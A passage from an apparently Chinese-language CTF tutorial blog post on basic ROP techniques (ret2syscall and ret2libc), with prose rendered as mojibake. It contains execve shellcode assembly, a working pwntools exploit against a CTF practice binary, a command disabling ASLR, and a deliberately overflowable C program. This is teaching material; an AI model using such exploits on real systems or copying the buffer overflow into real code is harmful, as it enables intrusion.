¸æœåŠ¡è¿›è¡Œé€šä¿¡ã€‚ç³»ç»Ÿè°ƒç”¨æä¾›<br>äº†è¿›ç¨‹ä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„åŸºæœ¬æ¥å£ã€‚<br>è‡³äºç³»ç»Ÿè°ƒç”¨åœ¨å…¶ä¸­å……å½“ä»€ä¹ˆè§’è‰²ï¼Œç¨åå†çœ‹ï¼Œç°åœ¨æˆ‘ä»¬è¦åšçš„æ˜¯ï¼šè®©ç¨‹åºè°ƒç”¨execve(â€œ/bin/shâ€,NULL,NULL)å‡½æ•°å³å¯æ‹¿åˆ°shell</p><h3 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h3><p><strong>æ±‡ç¼–å±‚é¢è°ƒç”¨shell</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov eax, <span class="number">0xb</span></span><br><span class="line">mov ebx, [<span class="string">&quot;/bin/sh&quot;</span>]  ;[<span class="string">&quot;/bin/sh&quot;</span>]è¡¨ç¤ºå­˜æ”¾å­—ç¬¦ä¸²<span class="string">&quot;/bin/sh&quot;</span>çš„åœ°å€</span><br><span class="line">mov ecx, <span class="number">0</span></span><br><span class="line">mov edx, <span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨æ­¤å‡½æ•°çš„å…·ä½“çš„æ­¥éª¤æ˜¯è¿™æ ·çš„ï¼šå› ä¸º<strong>è¯¥ç¨‹åºæ˜¯32ä½</strong>ï¼Œæ‰€ä»¥ï¼š</p><ul><li><code>eax</code> åº”è¯¥ä¸º <code>0xb</code></li><li><code>ebx</code>åº”è¯¥æŒ‡å‘<code>/bin/sh</code>çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ<code>sh</code>çš„åœ°å€ä¹Ÿå¯ä»¥</li><li><code>ecx</code>åº”è¯¥ä¸º<code>0</code></li><li><code>edx</code>åº”è¯¥ä¸º<code>0</code></li><li>æœ€åå†æ‰§è¡Œ<code>int 0x80</code>è§¦å‘ä¸­æ–­å³å¯æ‰§è¡Œ<code>execve()</code>è·å–shell<br>ç³»ç»Ÿåœ¨è¿è¡Œçš„æ—¶å€™ä¼šä½¿ç”¨ä¸Šé¢å››ä¸ªå¯„å­˜å™¨ï¼Œæ‰€ä»¥é‚£ä¹ˆä¸Šé¢å†…å®¹æˆ‘ä»¬å¯ä»¥å†™ä¸º<code>int 0x80(eax,ebx,ecx,edx)</code>ã€‚åªè¦æˆ‘ä»¬æŠŠå¯¹åº”è·å–shellçš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ‰§è¡Œint0x80å°±å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚<h3 id="ä½¿ç”¨å‰æ"><a href="#ä½¿ç”¨å‰æ" class="headerlink" title="ä½¿ç”¨å‰æ"></a>ä½¿ç”¨å‰æ</h3></li><li>å­˜åœ¨æ ˆæº¢å‡º<h3 id="å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Ÿ"><a href="#å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Ÿ" class="headerlink" title="å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Ÿ"></a>å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Ÿ</h3>åœ¨æˆ‘ä»¬æœ€å¼€å§‹å­¦ä¹ æ±‡ç¼–å‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬æœ€å¸¸ç”¨åˆ°çš„å°±æ˜¯pushï¼Œpopï¼ŒretæŒ‡ä»¤ï¼Œè€Œè¿™ä¸€æ¬¡æˆ‘ä»¬å°†ä½¿ç”¨popå’Œretçš„ç»„åˆæ¥æ§åˆ¶å¯„å­˜å™¨çš„å€¼ä»¥åŠæ‰§è¡Œæ–¹å‘ã€‚<blockquote><p>ä¾‹å¦‚ï¼šåœ¨ä¸€ä¸ªæ ˆä¸Šï¼Œ<em>å‡è®¾æ ˆé¡¶çš„å€¼ä¸º2ï¼Œå½“æˆ‘ä»¬pop eax,æ—¶ï¼Œ2å°±ä¼šå­˜è¿›eaxå¯„å­˜å™¨</em>ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åŒæ ·çš„æ–¹æ³•å®Œæˆexecve()å‡½æ•°å‚æ•°çš„æ§åˆ¶</p></blockquote></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop eax #ç³»ç»Ÿè°ƒç”¨å·è½½å…¥ï¼Œexecveä¸º<span class="number">0xb</span></span><br><span class="line">pop ebx #/bin/shdçš„<span class="built_in">string</span></span><br><span class="line">pop ecx #ç¬¬äºŒä¸ªå‚æ•°ï¼Œ<span class="number">0</span></span><br><span class="line">pop edx #ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œ<span class="number">0</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å¯„å­˜å™¨çš„å€¼å¯ä»¥æ§åˆ¶äº†ã€‚ç„¶åä½¿ç”¨gadgetsè®©è¿™ä¸€è¿ä¸²çš„popå‘½ä»¤é¡ºåºè¿æ¥æ‰§è¡Œï¼Œæœ€åä½¿ç”¨çš„retæŒ‡ä»¤ï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚</p><blockquote><p>ç®€å•çš„ç†è§£ï¼Œgadgetså°±æ˜¯ç¨‹åºä¸­çš„å°ç¢ç‰‡ï¼Œret2syscallå°±æ˜¯åˆ©ç”¨è¿™äº›å°ç¢ç‰‡æ¥æ‹¼æˆshellï¼Œä½¿ç”¨int 0x80ç³»ç»Ÿä¸­æ–­æ¥æ‰§è¡Œexecve()ï¼Œä»è€Œè¾¾æˆæ§åˆ¶ç³»ç»Ÿçš„ç›®çš„ã€‚</p></blockquote><h3 id="ç¤ºä¾‹-2"><a href="#ç¤ºä¾‹-2" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall">ctf-challenges/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall at master Â· ctf-wiki/ctf-challenges</a><br>è¿è¡Œ<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123185858.png" alt="Pasted image 20250123185858"><br>checksec<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123185747.png" alt="Pasted image 20250123185747"><br>32ä½ç¨‹åºï¼Œå¼€äº†NXä¿æŠ¤<br>å½“NXä¿æŠ¤å¼€å¯ï¼Œå°±è¡¨ç¤ºé¢˜ç›®ç»™äº†ä½ å…¨éƒ¨<code>system(&#39;/bin/sh&#39;ï¼‰</code>æˆ–éƒ¨åˆ†<code>&#39;/bin/sh&#39;</code>ï¼Œå¦‚æœå…³é—­ï¼Œè¡¨ç¤ºä½ éœ€è¦è‡ªå·±å»æ„é€ shellcode(ret2shellcode)<br>IDA<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123190238.png" alt="Pasted image 20250123190238"><br>æ—¢ç„¶å¼€äº†NXä¿æŠ¤ï¼Œæˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨<strong>ret2shellcode</strong>ï¼Œæ²¡æœ‰systemå‡½æ•°ï¼Œä¹Ÿæ— æ³•ä½¿ç”¨<strong>ret2text</strong>ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ç§å…¨æ–°çš„æ–¹æ³•ï¼š<strong>ret2syscall</strong>ã€‚<br>ä»IDAå¯ä»¥çœ‹åˆ°ï¼šç¨‹åºä»ç„¶ä½¿ç”¨äº†getså‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºçš„æ¡ä»¶ã€‚<br>å¾ˆå®¹æ˜“æµ‹å¾—æˆ‘ä»¬éœ€è¦è¦†ç›–çš„è¿”å›åœ°å€ç›¸å¯¹äºv4çš„åç§»ä¸º112ã€‚æ­¤æ¬¡ï¼Œç”±äºæˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„æŸä¸€æ®µä»£ç æˆ–è€…è‡ªå·²å¡«å†™ä»£ç æ¥è·å¾—shellï¼ˆå¼€äº†NXä¿æŠ¤ï¼Œæ ˆä¸Šçš„ä»£ç æ— æ³•æ‰§è¡Œ)ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„gadgetsæ¥è·å¾—shellï¼Œè€Œå¯¹åº”çš„shellè·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>åœ¨å‰é¢ä»‹ç»è¿‡ï¼Œåªè¦æˆ‘ä»¬æŠŠå¯¹åº”è·å–shellçš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æ‰§è¡Œ<code>int 0x80</code>å°±å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚æ¯”å¦‚è¯´è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨execve(<strong>â€œ/bin/shâ€</strong>,<em>NULL</em>,<em>NULL</em>)ç³»ç»Ÿè°ƒç”¨æ¥è·å–shellã€‚<br>å…¶ä¸­ï¼Œè¯¥<strong>ç¨‹åºæ˜¯32ä½</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿å¾—</p><ul><li>ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³<code>eax</code>åº”è¯¥ä¸º<code>0xb</code></li><li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³<code>ebx</code>åº”è¯¥æŒ‡å‘<code>/bin/sh</code>çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ<code>sh</code>çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³<code>ecx</code>åº”è¯¥ä¸º<code>0</code></li><li>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³<code>edx</code>åº”è¯¥ä¸º<code>0</code><br>è€Œæˆ‘ä»¬å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦ä½¿ç”¨gadgetsã€‚å…·ä½“å¯»æ‰¾gadgets<br>çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ropgadgetsè¿™ä¸ªå·¥å…·ã€‚</li><li>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥å¯»æ‰¾æ§åˆ¶eaxçš„gadgets:<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123193603.png" alt="Pasted image 20250123193603"></li><li>å¯»æ‰¾æ§åˆ¶å…¶ä»–å¯„å­˜å™¨çš„gadgets:<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123193810.png" alt="Pasted image 20250123193810"></li><li>è·å¾—/bin/shå­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123193957.png" alt="Pasted image 20250123193957"></li><li>è·å¾—int 0x80çš„åœ°å€<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123194016.png" alt="Pasted image 20250123194016"><h3 id="ç¼–å†™exp"><a href="#ç¼–å†™exp" class="headerlink" title="ç¼–å†™exp"></a>ç¼–å†™exp</h3></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123194802.png" alt="Pasted image 20250123194802"></p><blockquote><p>ä¸Šå›¾ä¸‹æ–¹ä¸ºé«˜åœ°å€</p></blockquote><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a><strong>ret2libc</strong></h2><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>ret2libcè¿™ç§æ”»å‡»æ–¹å¼ä¸»è¦æ˜¯é’ˆå¯¹<em>åŠ¨æ€é“¾æ¥(Dynamic linking)</em> [[1-6 åŠ¨æ€é“¾æ¥&amp;PLTè¡¨&amp;GOTè¡¨]]ç¼–è¯‘çš„ç¨‹åºï¼Œå› ä¸ºæ­£å¸¸æƒ…å†µä¸‹æ˜¯æ— æ³•åœ¨ç¨‹åºä¸­æ‰¾åˆ°åƒ<strong>system()ã€execve()</strong> è¿™ç§ç³»ç»Ÿçº§å‡½æ•°ã€‚<br>å› ä¸ºç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥ç”Ÿæˆçš„ï¼Œæ‰€ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶ä¼šè°ƒç”¨<strong>libc.so</strong>ï¼ˆ<em>ç¨‹åºè¢«è£…è½½æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šå°†ç¨‹åºæ‰€æœ‰æ‰€éœ€çš„åŠ¨æ€é“¾æ¥åº“åŠ è½½è‡³è¿›ç¨‹ç©ºé—´</em>ï¼Œ<strong>libc.so</strong>å°±æ˜¯å…¶ä¸­æœ€åŸºæœ¬çš„ä¸€ä¸ª)ï¼Œ<strong>libc.so</strong>æ˜¯linuxä¸‹Cè¯­è¨€åº“ä¸­çš„è¿è¡Œåº“<strong>glibc</strong>çš„åŠ¨æ€é“¾æ¥ç‰ˆï¼Œå¹¶ä¸”<strong>libc.so</strong>ä¸­åŒ…å«äº†å¤§é‡çš„å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼ŒåŒ…æ‹¬<strong>system()ã€execve()</strong> ç­‰ç³»ç»Ÿçº§å‡½æ•°ï¼Œ<em>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰¾åˆ°è¿™äº›å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€è¦†ç›–æ‰è¿”å›åœ°å€æ¥è·å¾—å½“å‰è¿›ç¨‹çš„æ§åˆ¶æƒ</em>ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ<strong>system(â€œ/bin/shâ€)</strong> æ¥æ‰“å¼€shellï¼Œå¦‚æ­¤å°±åªå‰©ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š</p><blockquote><p>1.æ‰¾åˆ°system)å‡½æ•°çš„åœ°å€;<br>2.åœ¨å†…å­˜ä¸­æ‰¾åˆ°â€/bin/shâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ã€‚</p><h3 id="åˆ©ç”¨å‰æ-1"><a href="#åˆ©ç”¨å‰æ-1" class="headerlink" title="åˆ©ç”¨å‰æ"></a>åˆ©ç”¨å‰æ</h3><p>r2libcæŠ€æœ¯æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨æŠ€æœ¯ï¼Œä¸»è¦ç”¨äºå…‹æœå¸¸è§„ç¼“å†²åŒºæº¢å‡ºæ¼æ´åˆ©ç”¨æŠ€æœ¯ä¸­é¢ä¸´çš„no stack executableé™åˆ¶<br>(<strong>æ‰€ä»¥åç»­å®éªŒè¿˜æ˜¯éœ€è¦å…³é—­ç³»ç»Ÿçš„ASLRï¼Œä»¥åŠå †æ ˆä¿æŠ¤</strong>)<br>æ¯”å¦‚PaXå’ŒExecShieldå®‰å…¨ç­–ç•¥ã€‚è¯¥æŠ€æœ¯ä¸»è¦æ˜¯é€šè¿‡è¦†ç›–æ ˆå¸§ä¸­ä¿å­˜çš„å‡½æ•°è¿”å›åœ°å€(eip)ï¼Œè®©å…¶å®šä½åˆ°libcåº“ä¸­çš„æŸä¸ªåº“å‡½æ•°(å¦‚ï¼Œsystemç­‰)ï¼Œè€Œä¸æ˜¯ç›´æ¥å®šä½åˆ°shellcodeã€‚ç„¶åé€šè¿‡åœ¨æ ˆä¸­ç²¾å¿ƒæ„é€ è¯¥åº“å‡½æ•°çš„å‚æ•°ï¼Œä»¥ä¾¿è¾¾åˆ°ç±»ä¼¼äºæ‰§è¡Œshellcodeçš„ç›®çš„ã€‚</p></blockquote><h3 id="æŠ€æœ¯åŸç†"><a href="#æŠ€æœ¯åŸç†" class="headerlink" title="æŠ€æœ¯åŸç†"></a>æŠ€æœ¯åŸç†</h3><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125141109.png" alt="Pasted image 20250125141109"></p><blockquote><p>Saved EIPæŒ‡ä¿å­˜callæŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€</p></blockquote><p>1) ä½¿ç”¨libcåº“ä¸­systemå‡½æ•°çš„åœ°å€è¦†ç›–æ‰åŸæœ¬çš„è¿”å›åœ°å€ï¼›è¿™æ ·åŸå‡½æ•°è¿”å›çš„æ—¶å€™ä¼šè½¬è€Œè°ƒç”¨systemå‡½æ•°ã€‚è·å–systemå‡½æ•°çš„è¿”å›åœ°å€å¾ˆç®€å•ï¼Œåªéœ€è¦ä½¿ç”¨gdbè°ƒè¯•ç›®æ ‡ç¨‹åºï¼Œåœ¨mainå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œç¨‹åºè¿è¡Œä¸­æ–­åœ¨æ–­ç‚¹å¤„åï¼Œä½¿ç”¨<code>p system</code>å‘½ä»¤å³å¯:</p><blockquote><p>è¯¥æ–¹æ³•å¯ä»¥è·å–ä»»æ„libcå‡½æ•°çš„åœ°å€ã€‚<br>2) è®¾ç½®systemå‡½æ•°è¿”å›åçš„åœ°å€ï¼Œä»¥åŠä¸ºsystemå‡½æ•°æ„é€ æˆ‘ä»¬é¢„å®šçš„å‚æ•°ã€‚</p></blockquote><p>éš¾ç‚¹ä¸»è¦åœ¨ç¬¬2æ­¥ä¸­systemå‡½æ•°ç›¸å…³çš„æ ˆå¸§ç»“æ„çš„å®‰æ’ä¸Šï¼Œæ¯”å¦‚ä¸ºä»€ä¹ˆFillerå°±æ˜¯Return Address After systemï¼Œä¸ºä»€ä¹ˆä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillterä¹‹åï¼Ÿè¿™å°±æ¶‰åŠåˆ°å‡½æ•°çš„è°ƒç”¨è§„åˆ™ã€‚æˆ‘ä»¬çŸ¥é“<strong>å‡½æ•°è°ƒç”¨åœ¨æ±‡ç¼–ä¸­é€šè¿‡callæŒ‡ä»¤å®ç°ï¼Œè€Œå‡½æ•°è¿”å›åˆ™é€šè¿‡retæŒ‡ä»¤å®ç°</strong>ã€‚CallæŒ‡ä»¤å¯ä»¥å®ç°å¤šç§æ–¹å¼çš„å‡½æ•°è·³è½¬ï¼Œè¿™é‡Œä¸ºäº†ç®€ä¾¿ï¼Œæš‚ä¸”åªè€ƒè™‘è·³è½¬åœ°å€åœ¨å†…å­˜ä¸­çš„callæŒ‡ä»¤çš„å®ç°</p><p>CPUåœ¨æ‰§è¡ŒcallæŒ‡ä»¤æ—¶éœ€è¦è¿›è¡Œä¸¤æ­¥æ“ä½œï¼š</p><ol><li>å°†å½“å‰çš„IP(ä¹Ÿå°±æ˜¯å‡½æ•°è¿”å›åœ°å€)å…¥æ ˆï¼Œå³ï¼š<code>push IP</code>;</li><li>è·³è½¬ï¼Œå³ï¼š <code>jmp dword ptr å†…å­˜å•å…ƒåœ°å€</code>ã€‚</li></ol><p>CPUåœ¨æ‰§è¡ŒretæŒ‡ä»¤æ—¶åªéœ€è¦æ¢å¤IPå¯„å­˜å™¨å³å¯ï¼Œå› æ­¤retæŒ‡ä»¤ç›¸å½“äº<code>pop IP</code>ã€‚<br>å› æ­¤å¯¹äºæ­£å¸¸å‡½æ•°è°ƒç”¨è€Œè¨€ï¼Œå…¶æ ˆå¸§ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125141603.png" alt="Pasted image 20250125141603"><br>ä½†æ˜¯ç”±äºæˆ‘ä»¬ä½¿ç”¨systemçš„å‡½æ•°åœ°å€æ›¿æ¢äº†åŸæœ¬çš„IPå¯„å­˜å™¨ï¼Œå¼ºåˆ¶æ‰§è¡Œsystemå‡½æ•°ï¼Œç ´åäº†åŸç¨‹åºçš„æ ˆå¸§åˆ†é…å’Œé‡Šæ”¾ç­–ç•¥ï¼Œæ‰€ä»¥åç»­çš„æ“ä½œå¿…é¡»åŸºäºè¿™ä¸ªè¢«ç ´åçš„æ ˆå¸§ç»“æ„å®ç°ã€‚</p><h4 id="ä¸ºä½•Filleræ˜¯å‡½æ•°çš„è¿”å›åœ°å€"><a href="#ä¸ºä½•Filleræ˜¯å‡½æ•°çš„è¿”å›åœ°å€" class="headerlink" title="ä¸ºä½•Filleræ˜¯å‡½æ•°çš„è¿”å›åœ°å€"></a>ä¸ºä½•Filleræ˜¯å‡½æ•°çš„è¿”å›åœ°å€</h4><p>è¿™éœ€è¦æˆ‘ä»¬æŸ¥çœ‹systemå‡½æ•°çš„æ±‡ç¼–å®ç°ã€‚é€šè¿‡ gdbè°ƒè¯•å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125141829.png" alt="Pasted image 20250125141829"><br>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡callæŒ‡ä»¤è¿›è¡Œå‡½æ•°è°ƒç”¨çš„ï¼Œå› æ­¤åœ¨è¿›å…¥åˆ°systemå‡½æ•°ä¹‹å‰ï¼ŒcallæŒ‡ä»¤å·²ç»é€šè¿‡push IPå°†å…¶è¿”å›åœ°å€pushåˆ°æ ˆå¸§ä¸­äº†ï¼Œæ‰€ä»¥åœ¨æ­£å¸¸æƒ…å†µä¸‹retæŒ‡ä»¤popåˆ° IPçš„æ•°æ®å°±æ˜¯ä¹‹å‰callæŒ‡ä»¤pushåˆ°æ ˆå¸§çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤è€…æ˜¯æˆå¯¹çš„ã€‚ä½†æ˜¯åœ¨æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨ä¸­ï¼Œç›´æ¥é€šè¿‡è¦†ç›–IPåœ°å€è·³è½¬åˆ°äº†systemå‡½æ•°ï¼Œè€Œå¹¶æ²¡æœ‰ç»è¿‡callè°ƒç”¨ï¼Œä¹Ÿå³æ˜¯æ²¡æœ‰push IPçš„æ“ä½œï¼Œä½†æ˜¯systemå‡½æ•°å´ç…§å¸¸è¿›è¡Œäº†retæŒ‡ä»¤çš„pop IPæ“ä½œã€‚é‚£ä¹ˆè¿™ä¸ªretæŒ‡ä»¤popåˆ°IPçš„æ˜¯å“ªä¸€å¤„åœ°å€çš„æ•°æ®å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯Filler!<br>åœ¨ç¨‹åºæ‰§è¡Œåˆ°å›¾ä¸­çš„Saved EIP(å³systemå‡½æ•°åœ°å€)çš„æ—¶å€™ï¼Œæ­¤æ—¶çš„ESPæŒ‡å‘äº†Fillerï¼Œç„¶åå°±è½¬è€Œæ‰§è¡Œsystemå‡½æ•°ã€‚é€šè¿‡åˆ†æsystemå‡½æ•°çš„æ±‡ç¼–å®ç°å¯ä»¥çœ‹å‡ºï¼šè¯¥å‡½æ•°ä¸­å¯¹ESPçš„æ“ä½œéƒ½æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œå¦‚<code>push %ebx</code>ä¸<code>pop %ebx</code>ç­‰ã€‚æ‰€ä»¥å½“æ‰§è¡Œåˆ°retæŒ‡ä»¤æ—¶ï¼ŒESPè¿˜æ˜¯æŒ‡å‘Fillerï¼Œä¹Ÿå°±æ˜¯è¯´retæŒ‡ä»¤å†…æ¶µçš„pop IPæ“ä½œå°±æ˜¯å°†Fillerçš„æ•°æ®popåˆ°IPå¯„å­˜å™¨ä¸­ï¼</p><h4 id="ä¸ºä½•ä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillerä¹‹å"><a href="#ä¸ºä½•ä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillerä¹‹å" class="headerlink" title="ä¸ºä½•ä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillerä¹‹å"></a>ä¸ºä½•ä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillerä¹‹å</h4><p>åœ¨æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ä¸­ï¼Œå…¶æ ˆå¸§åˆ†å¸ƒå¦‚å›¾1-2æ‰€ç¤ºï¼Œä½†æ˜¯åœ¨æ­¤æ¼æ´åˆ©ç”¨ä¸­ï¼Œç”±äºæˆ‘ä»¬å¼ºåˆ¶æ›´æ”¹äº†è°ƒç”¨è¿‡ç¨‹ï¼Œçœå»äº†callè°ƒç”¨çš„push IPæ­¥éª¤ï¼Œå› æ­¤å°±é€ æˆäº†<strong>Fillerå˜æˆäº†EIP</strong>ã€‚ä½†æ˜¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä¹Ÿä»…ä»…æ˜¯çœå»äº†push IPè¿™ä¸€æ­¥è€Œå·²ï¼Œå…¶ä»–æ­¥éª¤ä¸æ­£å¸¸å‡½æ•°è°ƒç”¨å¹¶æ— åŒºåˆ«ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å°†Fillerçœ‹åšæ˜¯ä¿å­˜çš„è¿”å›åœ°å€EIPçš„è¯ï¼Œé‚£ä¹ˆå®ƒâ€œ<strong>ä¹‹å(ç›¸å¯¹æ ˆå¢é•¿æ–¹å‘è€Œè¨€)</strong>â€çš„æ•°æ®å°±è‡ªç„¶è€Œç„¶å˜æˆäº†systemå‡½æ•°çš„å‚æ•°äº†ã€‚</p><h3 id="ç¤ºä¾‹1"><a href="#ç¤ºä¾‹1" class="headerlink" title="ç¤ºä¾‹1"></a>ç¤ºä¾‹1</h3><p>è®°å¾—å…³ASLR<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">```C</span><br><span class="line">#undef _FORTIFY_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulnerable_function() &#123;</span><br><span class="line">char buf[128];</span><br><span class="line">read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">vulnerable_function();</span><br><span class="line">write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125143551.png" alt="Pasted image 20250125143551"><br>è§‚å¯Ÿæºä»£ç ï¼Œå‘ç°åœ¨<code>vulnerable_function()</code>å‡½æ•°ä¸­ï¼Œbufåªæœ‰128å­—èŠ‚è€Œ read()å‡½æ•°å¯ä»¥è¯»256ä¸ªå­—èŠ‚é€ æˆäº†ç¼“å†²åŒºæº¢å‡ºã€‚å› ä¸ºç°åœ¨å¼€å¯äº†DEPé˜²æŠ¤ï¼Œæ‰€ä»¥ä¸èƒ½å¾€æ 